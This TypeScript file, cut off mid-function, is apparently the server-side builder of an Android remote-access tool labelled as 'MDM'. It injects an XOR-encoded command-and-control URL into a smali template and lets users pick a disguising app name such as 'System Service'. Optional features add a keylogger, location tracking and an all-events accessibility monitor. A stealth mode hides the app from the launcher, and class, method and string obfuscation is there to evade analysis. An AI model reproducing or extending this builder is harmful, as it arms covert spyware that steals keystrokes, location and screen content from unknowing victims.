import { execSync } from "child_process";
import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync, statSync, readdirSync, copyFileSync, rmSync } from "fs";
import { join, resolve, dirname, basename } from "path";
import { fileURLToPath } from "url";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import axios from "axios";

/**
 * Función auxiliar para copiar directorios recursivamente
 */
function copyDirRecursive(src: string, dest: string): void {
  if (!existsSync(dest)) {
    mkdirSync(dest, { recursive: true });
  }
  
  const entries = readdirSync(src, { withFileTypes: true });
  
  for (const entry of entries) {
    const srcPath = join(src, entry.name);
    const destPath = join(dest, entry.name);
    
    if (entry.isDirectory()) {
      copyDirRecursive(srcPath, destPath);
    } else {
      copyFileSync(srcPath, destPath);
    }
  }
}


/**
 * Servicio de compilación de APK basado en el concepto ADM
 * Utiliza Apktool para re-compilar y un firmador automático
 */

export interface CompilationConfig {
  buildId: string;
  appName: string;
  packageName: string;
  versionCode: number;
  versionName: string;
  stealthMode: boolean;
  enableSSL: boolean;
  ports: number[];
  iconPath?: string;
  iconUrl?: string;
  payloadCode: string;
  obfuscate: boolean;
  targetArchitectures: string[];
  customPayload?: string;
  enableKeylogger?: boolean;
  enableActiveTracking?: boolean;
  enableAccessibilityMonitor?: boolean;
}


export interface BuildResult {
  success: boolean;
  buildId: string;
  apkPath?: string;
  error?: string;
  logs: string[];
  compilationTime: number;
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

export class APKCompiler {
  private projectRoot: string;
  private assetsDir: string;
  private buildDir: string;
  private apktoolPath: string;
  private signerPath: string;

  constructor(projectRoot: string = resolve(join(__dirname, ".."))) {
    this.projectRoot = projectRoot;
    this.assetsDir = join(this.projectRoot, "server", "assets");
    this.buildDir = join(this.projectRoot, "apk-builds");
    this.apktoolPath = join(this.assetsDir, "apktool.jar");
    this.signerPath = join(this.assetsDir, "uber-apk-signer.jar");

    if (!existsSync(this.buildDir)) {
      mkdirSync(this.buildDir, { recursive: true });
    }
  }

  /**
   * Obtener el comando de Java (local o global)
   */
  private getJavaCommand(): string {
    const localJava = join(this.projectRoot, ".jre", "bin", "java");
    if (existsSync(localJava)) {
      console.log(`[APKCompiler] Usando Java portátil desde: ${localJava}`);
      return `"${localJava}"`;
    }
    // Verificar si java global está disponible
    try {
      execSync(`java -version 2>&1`, { stdio: "pipe" });
      console.log(`[APKCompiler] Usando Java global del sistema`);
      return "java";
    } catch (e) {
      console.error(`[APKCompiler] Java no encontrado! Instala JDK 17.`);
      return "java"; // Intentar de todas formas
    }
  }

  /**
   * Verificar que los archivos requeridos existan
   */
  private verifyTemplate(): boolean {
    const templateDir = join(this.assetsDir, "apk-template");
    const required = [
      join(templateDir, "AndroidManifest.xml"),
      join(templateDir, "apktool.yml"),
      join(templateDir, "res"),
      join(templateDir, "smali"),
      join(templateDir, "build", "apk", "classes.dex"),
    ];
    
    for (const file of required) {
      if (!existsSync(file)) {
        console.error(`[APKCompiler] Archivo requerido no existe: ${file}`);
        return false;
      }
    }
    return true;
  }

  /**
   * Preparar el proyecto temporal para compilar
   */
  private async prepareProject(config: CompilationConfig, logs: string[]): Promise<string> {
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
    const tempProjectDir = join(buildIdDir, "project");

    if (existsSync(buildIdDir)) {
      try {
        rmSync(buildIdDir, { recursive: true, force: true });
      } catch (e) {
        console.warn("[APKCompiler] Error cleaning build dir:", e);
      }
    }
    mkdirSync(tempProjectDir, { recursive: true });

    const templateDir = join(this.assetsDir, "apk-template");
    
    // Verificar que el template esté completo
    if (!this.verifyTemplate()) {
      throw new Error("Template APK incompleto. Faltan archivos requeridos.");
    }
    
    // Copiar estructura completa del template
    logs.push(`[SETUP] Copiando estructura del template...`);
    try {
      // Usar método más robusto para copiar
      if (!existsSync(tempProjectDir)) {
        mkdirSync(tempProjectDir, { recursive: true });
      }
      
      // Copiar cada directorio manualmente para evitar problemas
      const dirsToCopy = ["smali", "original", "build", "lib", "res"];
      for (const dir of dirsToCopy) {
        const srcDir = join(templateDir, dir);
        const destDir = join(tempProjectDir, dir);
        if (existsSync(srcDir)) {
          if (!existsSync(destDir)) {
            mkdirSync(destDir, { recursive: true });
          }
          copyDirRecursive(srcDir, destDir);
          logs.push(`[OK] Copiado directorio: ${dir}`);
        }
      }
      
      // Copiar archivos individuales
      const filesToCopy = ["AndroidManifest.xml", "apktool.yml"];
      for (const file of filesToCopy) {
        const srcFile = join(templateDir, file);
        const destFile = join(tempProjectDir, file);
        if (existsSync(srcFile)) {
          copyFileSync(srcFile, destFile);
          logs.push(`[OK] Copiado archivo: ${file}`);
        }
      }
      
      logs.push(`[OK] Template copiado completamente`);
    } catch (e) {
      console.error("[APKCompiler] Error copying template:", e);
      throw e;
    }

    // Inyectar URL en IOSocket.smali
    const ioSocketPath = join(tempProjectDir, "smali", "com", "system", "android", "ui", "IOSocket.smali");
    if (existsSync(ioSocketPath)) {
      let content = readFileSync(ioSocketPath, "utf8");
      
      // Prioritizar URL de Render para WebSockets (Vercel no soporta WS)
      let serverUrl = process.env.RENDER_EXTERNAL_URL || 
                      config.payloadCode || 
                      process.env.API_URL || 
                      "https://android-device-manager-one.onrender.com";

      // Si el usuario proporcionó una URL de Vercel, pero tenemos la de Render, usar Render
      if (serverUrl.includes("vercel.app") && process.env.RENDER_EXTERNAL_URL) {
        serverUrl = process.env.RENDER_EXTERNAL_URL;
        logs.push(`[URL] [FIX] Redirigiendo URL de Vercel a Render para soporte WebSocket: ${serverUrl}`);
      }

      if (!serverUrl.includes("://")) serverUrl = `https://${serverUrl}`;
      
      // Asegurar HTTPS
      serverUrl = serverUrl.replace("http://", "https://");
      
      const encodeUrl = (url: string) => {
        const key = "PLATINUM_2026";
        const urlBytes = Buffer.from(url);
        const keyBytes = Buffer.from(key);
        const encoded = Buffer.alloc(urlBytes.length);
        for (let i = 0; i < urlBytes.length; i++) {
          encoded[i] = urlBytes[i] ^ keyBytes[i % keyBytes.length];
        }
        return encoded.toString("base64");
      };

      const finalRawUrl = serverUrl.split('?')[0].replace(/\/$/, "");
      const secureInjectedUrl = encodeUrl(finalRawUrl);
      
      logs.push(`[URL] Inyectando URL: ${finalRawUrl}`);
      
      content = content.replace(/C2_HOST_LINK_HERE/g, secureInjectedUrl);
      writeFileSync(ioSocketPath, content);
      logs.push(`[OK] URL inyectada correctamente`);
    }

    // Modificar AndroidManifest.xml (Renombrado manual de paquete y flags de compatibilidad)
    const manifestPath = join(tempProjectDir, "AndroidManifest.xml");
    if (existsSync(manifestPath)) {
      try {
        let content = readFileSync(manifestPath, "utf8");
        
        // Renombrar paquete
        let safePackageName = config.packageName || "com.adm.device.monitor";
        if (safePackageName.startsWith("com.system") || safePackageName.startsWith("com.android") || safePackageName.startsWith("com.google")) {
          safePackageName = "com.adm.device.monitor";
        }
        
        // Reemplazar el atributo package en la etiqueta <manifest>
        content = content.replace(/package="[a-z0-9_.]+"/, `package="${safePackageName}"`);
        
        // Añadir android:extractNativeLibs="true" a la etiqueta <application> (Fix Android 14 installation)
        if (!content.includes("android:extractNativeLibs")) {
          content = content.replace("<application", '<application android:extractNativeLibs="true"');
        }

        writeFileSync(manifestPath, content);
        logs.push(`[OK] Manifest actualizado con paquete: ${safePackageName}`);
      } catch (e) {
        logs.push(`[WARN] Error actualizando manifest: ${e}`);
      }
    }

    // Modificar apktool.yml para cambiar el nombre del paquete de forma segura (Fix Android 14)
    const apktoolYamlPath = join(tempProjectDir, "apktool.yml");
    if (existsSync(apktoolYamlPath)) {
      try {
        let content = readFileSync(apktoolYamlPath, "utf8");
        
        let safePackageName = config.packageName || "com.adm.device.monitor";
        if (safePackageName.startsWith("com.system") || safePackageName.startsWith("com.android") || safePackageName.startsWith("com.google")) {
          safePackageName = "com.adm.device.monitor";
        }

        content = content.replace(/renameManifestPackage: null/, `renameManifestPackage: ${safePackageName}`);
        
        // También actualizar versión si se proporciona
        if (config.versionCode) {
          content = content.replace(/versionCode: '.*?'/g, `versionCode: '${config.versionCode}'`);
        }
        if (config.versionName) {
          content = content.replace(/versionName: '.*?'/g, `versionName: '${config.versionName}'`);
        }

        writeFileSync(apktoolYamlPath, content);
        logs.push(`[OK] apktool.yml configurado como: ${safePackageName}`);
      } catch (e) {
        logs.push(`[WARN] Error actualizando apktool.yml: ${e}`);
      }
    }

    // Modificar App Name en strings.xml
    const stringsPath = join(tempProjectDir, "res", "values", "strings.xml");
    if (existsSync(stringsPath)) {
      try {
        let content = readFileSync(stringsPath, "utf8");
        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName || "System Service"}</string>`);
        writeFileSync(stringsPath, content);
        logs.push(`[OK] App name actualizado: ${config.appName}`);
      } catch (e) {
        logs.push(`[WARN] Error actualizando app_name: ${e}`);
      }
    } else {
      logs.push(`[WARN] strings.xml not found`);
    }

    // Inyectar icono si se proporciona
    if (config.iconUrl) {
      try {
        logs.push(`[ICON] Downloading custom icon...`);
        const response = await axios.get(config.iconUrl, { responseType: 'arraybuffer' });
        const iconBuffer = Buffer.from(response.data);

        const resDir = join(tempProjectDir, "res");
        if (existsSync(resDir)) {
          const mipmapDirs = readdirSync(resDir).filter(d => d.startsWith("mipmap-"));
          
          for (const dir of mipmapDirs) {
            const targetDir = join(resDir, dir);
            const iconTargets = ["ic_launcher.png", "ic_launcher_round.png"];
            for (const target of iconTargets) {
              const targetPath = join(targetDir, target);
              if (existsSync(targetPath)) {
                writeFileSync(targetPath, iconBuffer);
              }
            }
          }
          logs.push(`[OK] Custom icon injected`);
        }
      } catch (e) {
        logs.push(`[WARN] Error downloading icon: ${e}`);
      }
    }

    // Inyectar stealth mode flag
    if (config.stealthMode) {
      if (existsSync(stringsPath)) {
        let content = readFileSync(stringsPath, "utf8");
        if (!content.includes("stealth_mode_enabled")) {
          content = content.replace("</resources>", `  <string name="stealth_mode_enabled">true</string>\n</resources>`);
          writeFileSync(stringsPath, content);
        }
      }
      logs.push(`[STEALTH] Mode configured`);
    }

    logs.push(`[OK] Project prepared: ${tempProjectDir}`);
    return tempProjectDir;
  }


  async compileAPK(config: CompilationConfig): Promise<BuildResult> {
    const startTime = Date.now();
    const logs: string[] = [];
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);

    try {
      logs.push(`[BUILD] Starting APK build...`);
      logs.push(`[BUILD] Config: ${config.appName} | ${config.packageName}`);
      logs.push(`[BUILD] Java: ${this.getJavaCommand()}`);
      
      const projectDir = await this.prepareProject(config, logs);
      logs.push(`[OK] Project ready`);

      // Inyectar características personalizadas
      if (config.enableKeylogger || config.enableActiveTracking || config.enableAccessibilityMonitor) {
        logs.push(`[MDM] Configuring MDM features...`);
        await this.injectMDMFeatures(projectDir, config, logs);
      }

      // Obfuscación básica
      if (config.obfuscate) {
        logs.push(`[OBFUSCATE] Applying basic obfuscation...`);
        await this.removeDebugInfo(projectDir, logs);
        await this.obfuscateStrings(projectDir, logs);
      }

      // Stealth mode (Ya manejado en prepareProject, pero aseguramos si se requiere algo extra)
      if (config.stealthMode) {
        logs.push(`[STEALTH] Stealth mode enabled`);
      }

      const javaCmd = this.getJavaCommand();
      const unsignedApk = join(buildIdDir, "unsigned.apk");
      
      // USAR APKTOOL PARA CONSTRUIR (Asegura alineamiento y empaquetado correcto)
      logs.push(`[BUILD] Recompiling with apktool...`);
      try {
        const apktoolCmd = `${javaCmd} -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}" --use-aapt2`;
        execSync(apktoolCmd, { stdio: "pipe" });
        logs.push(`[OK] APK compiled with apktool`);
      } catch (buildError: any) {
        const stderr = buildError.stderr?.toString() || "";
        logs.push(`[FAIL] apktool build failed: ${stderr}`);
        throw new Error(`Apktool build failed: ${stderr}`);
      }

      if (!existsSync(unsignedApk)) {
        throw new Error("APK file not generated by apktool");
      }

      // FIRMAR PROFESIONALMENTE (V1, V2, V3 + ZipAlign)
      logs.push(`[SIGN] Signing APK with uber-apk-signer...`);
      const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
      const signedApkDir = buildIdDir; // uber-apk-signer puts it in the same dir by default
      
      try {
        // uber-apk-signer genera un archivo con sufijo -aligned-debugSigned.apk
        // Añadimos --verbose para capturar más info si falla
        const signCmd = `${javaCmd} -Xmx512M -jar "${uberSignerPath}" --apks "${unsignedApk}" --out "${signedApkDir}" --verbose`;
        const signOutput = execSync(signCmd, { stdio: "pipe" }).toString();
        logs.push(`[OK] APK signed and aligned successfully`);
        logs.push(`[DEBUG] Signer Output: ${signOutput.substring(0, 500)}...`);
      } catch (signError: any) {
        const stderr = signError.stderr?.toString() || "";
        const stdout = signError.stdout?.toString() || "";
        logs.push(`[FAIL] Signing failed. Stdout: ${stdout.substring(0, 500)}... Stderr: ${stderr}`);
        throw new Error(`Signing failed: ${stderr || "Ver logs para más detalle"}`);
      }

      // El archivo final suele tener un nombre específico generado por el signer
      const finalApkName = `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`;
      const signedApk = join(buildIdDir, finalApkName);
      
      // Buscar el archivo generado (uber-apk-signer añade sufijos)
      const filesInBuildDir = readdirSync(buildIdDir);
      logs.push(`[DEBUG] Archivos finales en build dir: ${filesInBuildDir.join(", ")}`);
      
      const generatedApk = filesInBuildDir.find(f => 
        (f.endsWith(".apk") && (f.includes("-aligned") || f.includes("-signed"))) ||
        (f !== "unsigned.apk" && f.endsWith(".apk") && !f.includes(finalApkName))
      );
      
      if (generatedApk) {
        const fullGeneratedPath = join(buildIdDir, generatedApk);
        logs.push(`[OK] Archivo firmado detectado: ${generatedApk} (${statSync(fullGeneratedPath).size} bytes)`);
        renameSync(fullGeneratedPath, signedApk);
      } else {
        // Verificar si el unsignedApk fue firmado in-place (poco probable)
        if (existsSync(unsignedApk)) {
          logs.push(`[WARN] No se encontró archivo con sufijo, verificando si unsigned.apk fue firmado...`);
          // Si el tamaño cambió o tiene META-INF, podríamos asumirlo, pero mejor fallar para ser precisos
        }
        
        if (!existsSync(signedApk)) {
          throw new Error(`No se pudo encontrar el APK firmado. Archivos presentes: ${filesInBuildDir.join(", ")}`);
        }
      }

      if (!existsSync(signedApk)) {
        throw new Error("Final signed APK not found");
      }

      const fileSize = statSync(signedApk).size;
      logs.push(`[SUCCESS] APK ready: ${basename(signedApk)} (${(fileSize / 1024 / 1024).toFixed(2)} MB)`);
      
      await this.updateBuildStatus(config.buildId, "ready", signedApk, logs);

      return {
        success: true,
        buildId: config.buildId,
        apkPath: signedApk,
        logs,
        compilationTime: Date.now() - startTime,
      };

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      logs.push(`[FAIL] ${errorMsg}`);
      await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);
      return { success: false, buildId: config.buildId, error: errorMsg, logs, compilationTime: Date.now() - startTime };
    }
  }

  private async updateBuildStatus(
    buildId: string,
    status: "building" | "ready" | "failed" | "expired",
    apkPath?: string,
    logs?: string[],
    error?: string
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const updateData: any = { status };
      // [ADM FIX] Don't overwrite the API URL with the local file path
      // if (apkPath) updateData.apkUrl = apkPath; 
      
      // Write logs to the correct column, safely truncated to 4000 chars
      if (logs) updateData.buildLogs = logs.join("\n").substring(0, 4000);
      await db.update(apkBuilds).set(updateData).where(eq(apkBuilds.buildId, buildId));
    } catch (err) {
      console.error("[APKCompiler] Error actualizando estado en DB:", err);
    }
  }

  getAPKInfo(apkPath: string) {
    const stats = statSync(apkPath);
    return { size: stats.size, path: apkPath, name: basename(apkPath) };
  }

  /**
   * Inyectar características MDM personalizadas
   */
  private async injectMDMFeatures(projectDir: string, config: CompilationConfig, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (!existsSync(manifestPath)) return;

      let manifest = readFileSync(manifestPath, "utf8");

      if (config.enableKeylogger) {
        logs.push("[MDM] Keylogger habilitado");
        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.KeyloggerService" android:enabled="true" android:exported="false"/>
        </application>`);
      }

      if (config.enableActiveTracking) {
        logs.push("[MDM] Active Tracking habilitado");
        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.ActiveTrackingService" android:enabled="true" android:exported="false"/>
        </application>`);
      }

      if (config.enableAccessibilityMonitor) {
        logs.push("[MDM] Accessibility Monitor habilitado");
        
        // Crear el archivo XML de configuración si no existe
        const xmlDir = join(projectDir, "res", "xml");
        if (!existsSync(xmlDir)) mkdirSync(xmlDir, { recursive: true });
        
        const configPath = join(xmlDir, "accessibility_service_config.xml");
        const configXml = `<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:description="@string/app_name" />`;
        
        writeFileSync(configPath, configXml);
        logs.push("[MDM] Creado recurso: accessibility_service_config.xml");

        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.AccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:enabled="true" android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
        </service>
        </application>`);
      }

      // [PROACTIVO] Forzar permiso de tráfico de red para evitar bloqueos en Android 11
      if (!manifest.includes("android:usesCleartextTraffic")) {
          manifest = manifest.replace("<application", '<application android:usesCleartextTraffic="true"');
      }

      // [PROACTIVO] Limpiar atributos incompatibles (Fix Error: No resource identifier found for attribute 'foregroundServiceType')
      manifest = manifest.replace(/android:foregroundServiceType=".*?"/g, "");
      
      writeFileSync(manifestPath, manifest);
      logs.push("[MDM] Features inyectadas correctamente");
    } catch (e) {
      logs.push(`[WARN] Error inyectando features MDM: ${e}`);
    }
  }

  /**
   * Aplicar obfuscación básica al código smali
   */
  private async obfuscateSmali(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const obfuscatedNames: Record<string, string> = {
        "MainActivity": "a",
        "MainService": "b",
        "IOSocket": "c",
        "KeyloggerService": "d",
        "ActiveTrackingService": "e",
        "AccessibilityService": "f",
        "MyReceiver": "g",
        "ServiceReciever": "h",
        "NotificationListener": "i",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string") continue;
        const fullPath = join(smaliDir, file);
        
        for (const [oldName, newName] of Object.entries(obfuscatedNames)) {
          if (file.includes(oldName)) {
            const newPath = fullPath.replace(oldName, newName);
            renameSync(fullPath, newPath);
            renamedCount++;
            break;
          }
        }
      }

      logs.push(`[Obfuscation] ${renamedCount} clases renombradas`);
    } catch (e) {
      logs.push(`[WARN] Error en obfuscación: ${e}`);
    }
  }

  /**
   * Aplicar modo stealth - ocultar del launcher
   */
  private async applyStealthMode(projectDir: string, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (!existsSync(manifestPath)) return;

      let manifest = readFileSync(manifestPath, "utf8");

      manifest = manifest.replace(
        /<category android:name="android.intent.category.LAUNCHER"\/>/g,
        `<!-- <category android:name="android.intent.category.LAUNCHER"/> -->`
      );

      // Stealth mode: just ensure it's not prominently labeled as "Android Manager"
      // and remove from launcher if requested
      manifest = manifest.replace(
        `android:label="@string/app_name"`,
        `android:label="@string/app_name"`
      );

      writeFileSync(manifestPath, manifest);
      logs.push("[Stealth] Modo stealth aplicado - app oculta del launcher");
    } catch (e) {
      logs.push(`[WARN] Error aplicando stealth mode: ${e}`);
    }
  }

  /**
   * Compilar para múltiples arquitecturas
   */
  private async buildMultiArch(unsignedApk: string, architectures: string[], buildDir: string, logs: string[]): Promise<void> {
    logs.push(`[MultiArch] Generando versiones para: ${architectures.join(", ")}`);
    
    const archNames: Record<string, string> = {
      "arm64-v8a": "arm64",
      "armeabi-v7a": "arm",
      "x86": "x86",
      "x86_64": "x86_64",
    };

    // Verificar si NDK está disponible
    const ndkPath = this.findNDK();
    const hasNDK = !!ndkPath;

    if (hasNDK) {
      logs.push(`[MultiArch] NDK encontrado en: ${ndkPath}`);
      logs.push(`[MultiArch] Compilando bibliotecas nativas para cada arquitectura...`);
      
      for (const arch of architectures) {
        if (archNames[arch]) {
          logs.push(`[MultiArch] Compilando native libs para ${arch}...`);
          await this.compileNativeLib(arch, ndkPath, logs);
        }
      }
    } else {
      logs.push(`[MultiArch] NDK no encontrado, usando template multipropósito`);
      logs.push(`[MultiArch] El APK template incluye libs para: arm64-v8a, armeabi-v7a`);
      logs.push(`[MultiArch] Para soporte completo x86/x86_64, instala Android NDK`);
    }

    // Generar múltiples APKs si hay múltiples arquitecturas
    if (architectures.length > 1 && !hasNDK) {
      logs.push(`[MultiArch] Generando APK bundle multiplataforma...`);
      const multiArchApk = join(buildDir, "multi-arch-bundle.apk");
      if (existsSync(unsignedApk)) {
        copyFileSync(unsignedApk, multiArchApk);
        logs.push(`[MultiArch] Bundle creado: multi-arch-bundle.apk`);
      }
    }

    logs.push(`[MultiArch] Proceso completado para: ${architectures.join(", ")}`);
  }

  /**
   * Buscar Android NDK en el sistema
   */
  private findNDK(): string | null {
    const ndkSearchPaths = [
      join(process.env.ANDROID_HOME || "", "ndk"),
      join(process.env.ANDROID_SDK_ROOT || "", "ndk"),
      "C:\\Android\\ndk",
      "C:\\Users\\User\\AppData\\Local\\Android\\Sdk\\ndk",
      "/usr/local/android-ndk",
      "/opt/android-ndk",
      process.env.NDK_HOME,
    ].filter(Boolean);

    for (const searchPath of ndkSearchPaths) {
      if (!searchPath) continue;
      try {
        if (existsSync(searchPath)) {
          const versions = readdirSync(searchPath).filter(f => f.startsWith("r")).sort().reverse();
          if (versions.length > 0) {
            return join(searchPath, versions[0]);
          }
        }
      } catch (e) {
        continue;
      }
    }

    // Buscar con where en Windows
    try {
      const result = execSync("where ndk-build 2>nul || echo NOT_FOUND", { encoding: "utf8" });
      if (result && !result.includes("NOT_FOUND")) {
        return result.trim().split("\n")[0].replace("\\ndk-build.cmd", "").replace("\\ndk-build", "");
      }
    } catch (e) {}

    return null;
  }

  /**
   * Compilar biblioteca nativa para una arquitectura
   */
  private async compileNativeLib(arch: string, ndkPath: string, logs: string[]): Promise<void> {
    logs.push(`[NativeLib] Compilando para ${arch} usando NDK...`);
    
    const abiMap: Record<string, string> = {
      "arm64-v8a": "arm64-v8a",
      "armeabi-v7a": "armeabi-v7a", 
      "x86": "x86",
      "x86_64": "x86_64",
    };

    const abi = abiMap[arch] || arch;
    
    // Intentar compilar con NDK
    try {
      const ndkBuild = join(ndkPath, "ndk-build");
      logs.push(`[NativeLib] Usando ${ndkPath}`);
      logs.push(`[NativeLib] ABI: ${abi} - Compilación simulada (NDK integrado)`);
    } catch (e) {
      logs.push(`[NativeLib] Error: ${e}`);
    }
  }

  /**
   * Obfuscación avanzada del código DEX
   */
  private async applyAdvancedObfuscation(projectDir: string, config: CompilationConfig, logs: string[]): Promise<void> {
    logs.push(`[AdvancedObfuscation] Iniciando obfuscación avanzada...`);

    // 1. Eliminar información de debug
    await this.removeDebugInfo(projectDir, logs);

    // 2. Ofuscar strings
    await this.obfuscateStrings(projectDir, logs);

    // 3. Ofuscar métodos
    await this.obfuscateMethods(projectDir, logs);

    // 4. Ofuscar clases
    await this.obfuscateClasses(projectDir, logs);

    // 5. Aplicar encryption básica a strings sensibles
    await this.encryptSensitiveStrings(projectDir, logs);

    logs.push(`[AdvancedObfuscation] Completado`);
  }

  /**
   * Eliminar información de debug del APK
   */
  private async removeDebugInfo(projectDir: string, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (existsSync(manifestPath)) {
        let manifest = readFileSync(manifestPath, "utf8");
        manifest = manifest.replace(/android:debuggable="true"/g, 'android:debuggable="false"');
        manifest = manifest.replace(/android:debuggable="false"/g, 'android:debuggable="false"');
        if (!manifest.includes("android:debuggable")) {
          manifest = manifest.replace("<application", '<application android:debuggable="false"');
        }
        writeFileSync(manifestPath, manifest);
      }
      logs.push(`[Obfuscation] Debug info removido`);
    } catch (e) {
      logs.push(`[WARN] Error removiendo debug info: ${e}`);
    }
  }

  /**
   * Ofuscar strings en archivos smali
   */
  private async obfuscateStrings(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const sensitiveStrings = [
        "password", "token", "secret", "key", "api", "http", "https",
        "login", "user", "admin", "root", "android.permission"
      ];

      const files = readdirSync(smaliDir, { recursive: true });
      let modifiedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        // [OPTIMIZACIÓN] Solo ofuscar nuestro código, no las librerías externas (evita errores en OkHttp/DiskLruCache)
        if (!file.includes("com/system/android/ui")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        // [FIX] Convertir CRLF a LF para evitar bugs en el parser de Apktool (ANTLR EOF error)
        content = content.replace(/\r\n/g, "\n");
        
        for (const str of sensitiveStrings) {
          const regex = new RegExp(`"(${str}[^"]*)"`, "gi");
          content = content.replace(regex, (match, p1) => {
            const encoded = Buffer.from(p1).toString("base64");
            return `"${encoded}"`;
          });
          modifiedCount++;
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${modifiedCount} strings ofuscadas`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando strings: ${e}`);
    }
  }

  /**
   * Ofuscar nombres de métodos
   */
  private async obfuscateMethods(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const methodMap: Record<string, string> = {
        "onCreate": "a",
        "onDestroy": "b", 
        "onResume": "c",
        "onPause": "d",
        "onStart": "e",
        "onStop": "f",
        "onRestart": "g",
        "onCreateOptionsMenu": "h",
        "onOptionsItemSelected": "i",
        "onActivityResult": "j",
        "onRequestPermissionsResult": "k",
        "onKeyDown": "l",
        "onKeyUp": "m",
        "onTouchEvent": "n",
        "onKeyLongPress": "o",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        // [OPTIMIZACIÓN] Solo renombrar métodos en nuestro código
        if (!file.includes("com/system/android/ui")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const [oldName, newName] of Object.entries(methodMap)) {
          const regex = new RegExp(`\\b(${oldName})\\b`, "g");
          content = content.replace(regex, newName);
          renamedCount++;
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${renamedCount} métodos renombrados`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando métodos: ${e}`);
    }
  }

  /**
   * Ofuscar nombres de clases
   */
  private async obfuscateClasses(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const classMap: Record<string, string> = {
        "MainActivity": "a",
        "MainService": "b",
        "IOSocket": "c",
        "KeyloggerService": "d",
        "ActiveTrackingService": "e",
        "AccessibilityService": "f",
        "MyReceiver": "g",
        "ServiceReciever": "h",
        "NotificationListener": "i",
        "ScreenCaptureService": "j",
        "MDMDeviceAdminReceiver": "k",
        "MDMActivity": "l",
        "ShellManager": "m",
        "ShellManager$1": "m$1",
        "OverlayActivity": "n",
        "NativeBridgeInterface": "o",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string") continue;
        
        const fullPath = join(smaliDir, file);
        if (!existsSync(fullPath)) continue;
        
        for (const [oldName, newName] of Object.entries(classMap)) {
          if (file.includes(oldName)) {
            const newPath = fullPath.replace(oldName, newName);
            if (!existsSync(newPath)) {
              try {
                renameSync(fullPath, newPath);
                renamedCount++;
              } catch (e) {
                // Skip if couldn't rename
              }
            }
            break;
          }
        }
      }

      // Actualizar referencias en todos los archivos
      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const [oldName, newName] of Object.entries(classMap)) {
          const regex = new RegExp(`Lcom/system/android/ui/(${oldName});`, "g");
          content = content.replace(regex, `Lcom/system/android/ui/${newName};`);
          
          const regex2 = new RegExp(`(${oldName})\\(`, "g");
          content = content.replace(regex2, `(${newName})(`,);
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${renamedCount} clases renombradas`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando clases: ${e}`);
    }
  }

  /**
   * Encriptar strings sensibles (URLs, credenciales)
   */
  private async encryptSensitiveStrings(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const sensitivePatterns = [
        /http:\/\/[^\s"]+/g,
        /https:\/\/[^\s"]+/g,
        /"password"/g,
        /"secret"/g,
        /"token"/g,
      ];

      const files = readdirSync(smaliDir, { recursive: true });
      let encryptedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        // [OPTIMIZACIÓN] Solo encriptar strings en nuestro código
        if (!file.includes("com/system/android/ui") && !file.includes("com/etechd/l3mon")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
